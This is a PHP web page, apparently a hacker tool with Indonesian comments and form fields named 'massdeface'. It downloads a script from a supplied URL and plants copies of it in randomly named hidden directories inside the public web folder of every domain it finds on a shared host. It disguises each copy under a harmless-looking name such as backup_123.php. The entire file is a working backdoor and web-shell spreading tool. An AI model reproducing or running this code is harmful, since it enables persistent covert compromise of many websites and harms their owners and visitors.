<!DOCTYPE html>
<html>
<head>
    <title>Mass Copy Script</title>
    <META NAME="robots" CONTENT="noindex,nofollow">
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; }
        .container { max-width: 800px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        textarea { width: 100%; height: 200px; font-family: monospace; }
        input[type="text"] { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; }
        input[type="submit"] { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
        input[type="submit"]:hover { background: #45a049; }
        .log { background: #f8f8f8; padding: 15px; border-left: 4px solid #4CAF50; margin: 10px 0; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
<div class="container">
    <center><h1>Mass Copy Script</h1></center>
    <center><h3>Result:</h3>
    <?php
    // Fungsi untuk generate nama file random tapi masuk akal
    function generateRandomFilename() {
        $prefixes = ['backup', 'temp', 'cache', 'data', 'config', 'system', 'core', 'lib', 'module', 'plugin'];
        $suffixes = ['php', 'inc', 'class', 'func', 'helper', 'util', 'handler', 'processor'];
        $rand = rand(100, 999);
        $prefix = $prefixes[array_rand($prefixes)];
        $suffix = $suffixes[array_rand($suffixes)];
        return $prefix . '_' . $rand . '.' . $suffix;
    }

    // Fungsi untuk mendeteksi public_html path
    function findPublicHtml($basePath) {
        $paths = [
            '/public_html/',
            '/www/',
            '/htdocs/',
            '/html/',
            '/public/',
            '/web/',
            '/site/'
        ];
        
        foreach ($paths as $path) {
            $testPath = $basePath . $path;
            if (is_dir($testPath)) {
                return $testPath;
            }
        }
        return false;
    }

    // Fungsi untuk scan semua domain
    function scanDomains($basePath) {
        $domains = [];
        $homePath = rtrim($basePath, '/');
        
        // Coba deteksi struktur /home/USER/domains/
        if (strpos($homePath, '/domains/') !== false) {
            $domainPath = substr($homePath, 0, strpos($homePath, '/domains/') + 9);
            if (is_dir($domainPath)) {
                $domainDirs = scandir($domainPath);
                foreach ($domainDirs as $dir) {
                    if ($dir != '.' && $dir != '..' && is_dir($domainPath . '/' . $dir)) {
                        $publicHtml = findPublicHtml($domainPath . '/' . $dir . '/');
                        if ($publicHtml) {
                            $domains[] = [
                                'domain' => $dir,
                                'path' => $publicHtml
                            ];
                        }
                    }
                }
            }
        }
        
        return $domains;
    }

    // Proses utama
    if (isset($_POST['execmassdeface']) && isset($_POST['massdefaceurl'])) {
        $sourceUrl = $_POST['massdefaceurl'];
        $baseDir = $_POST['massdefacedir'];
        $log = [];
        $successCount = 0;
        $failCount = 0;
        
        // Validasi source URL
        if (!filter_var($sourceUrl, FILTER_VALIDATE_URL)) {
            echo "<div class='log error'>Error: Invalid source URL!</div>";
            exit;
        }
        
        // Ambil content dari source URL
        $sourceContent = @file_get_contents($sourceUrl);
        if ($sourceContent === false) {
            echo "<div class='log error'>Error: Cannot fetch content from source URL!</div>";
            exit;
        }
        
        // Deteksi struktur direktori
        $currentUser = get_current_user();
        $homePath = "/home/" . $currentUser . "/";
        
        // Cari semua domain
        $domains = scanDomains($homePath);
        
        if (empty($domains)) {
            // Jika tidak ada domain ditemukan, gunakan direktori yang diberikan
            echo "<div class='log'>No domains found. Using specified directory...</div>";
            $targetDir = rtrim($baseDir, '/') . '/';
            
            if (!is_writable($targetDir)) {
                echo "<div class='log error'>Error: Directory not writable!</div>";
                exit;
            }
            
            // Buat hidden directory
            $hiddenDir = $targetDir . '.' . md5(rand(1000,9999)) . '/';
            if (!is_dir($hiddenDir)) {
                mkdir($hiddenDir, 0755, true);
            }
            
            $randomFile = generateRandomFilename();
            $newFile = $hiddenDir . $randomFile;
            
            if (file_put_contents($newFile, $sourceContent)) {
                $successCount++;
                $log[] = "<span class='success'>✓ Success: " . $newFile . "</span>";
            } else {
                $failCount++;
                $log[] = "<span class='error'>✗ Failed: " . $newFile . "</span>";
            }
            
        } else {
            // Proses setiap domain
            foreach ($domains as $domain) {
                $publicHtml = $domain['path'];
                echo "<div class='log'>Processing domain: <strong>" . $domain['domain'] . "</strong> (Path: " . $publicHtml . ")</div>";
                
                // Cek apakah public_html writable
                if (!is_writable($publicHtml)) {
                    $log[] = "<span class='error'>✗ Domain " . $domain['domain'] . " not writable!</span>";
                    continue;
                }
                
                // Buat hidden directory di dalam public_html
                $hiddenDir = $publicHtml . '.' . md5(rand(1000,9999)) . '/';
                if (!is_dir($hiddenDir)) {
                    if (!mkdir($hiddenDir, 0755, true)) {
                        $log[] = "<span class='error'>✗ Cannot create hidden directory in " . $domain['domain'] . "</span>";
                        continue;
                    }
                }
                
                // Generate random filename
                $randomFile = generateRandomFilename();
                $newFile = $hiddenDir . $randomFile;
                
                // Copy file
                if (file_put_contents($newFile, $sourceContent)) {
                    $successCount++;
                    $log[] = "<span class='success'>✓ Success: " . $newFile . "</span>";
                } else {
                    $failCount++;
                    $log[] = "<span class='error'>✗ Failed: " . $newFile . "</span>";
                }
            }
        }
        
        // Tampilkan log lengkap
        echo "<div class='log'>";
        echo "<strong>Execution Log:</strong><br>";
        echo "Total Success: " . $successCount . " | Total Failed: " . $failCount . "<br><br>";
        foreach ($log as $entry) {
            echo $entry . "<br>";
        }
        echo "</div>";
    }
    ?>
    
    <form action='<?php echo basename($_SERVER['PHP_SELF']); ?>' method='post'>
        <table width="100%">
            <tr>
                <td><strong>Main Directory:</strong></td>
                <td><input type='text' style='width: 100%' value='<?php echo getcwd() . "/"; ?>' name='massdefacedir'></td>
            </tr>
            <tr>
                <td><strong>Script URL:</strong></td>
                <td><input type='text' style='width: 100%' name='massdefaceurl' placeholder='http://example.com/script.php'></td>
            </tr>
            <tr>
                <td colspan="2" align="center">
                    <input type='submit' name='execmassdeface' value='Execute'>
                </td>
            </tr>
        </table>
    </form>
    
    <div style="margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px;">
        <small>
            <strong>Info:</strong><br>
            • Akan mendeteksi otomatis struktur /home/USER/domains/<br>
            • Menyimpan file di direktori tersembunyi (.random_name/)<br>
            • Nama file random tapi masuk akal (contoh: backup_123.php)<br>
            • Log lengkap ditampilkan setelah eksekusi<br>
            • Mendukung berbagai struktur webserver
        </small>
    </div>
</div>
</body>
</html>
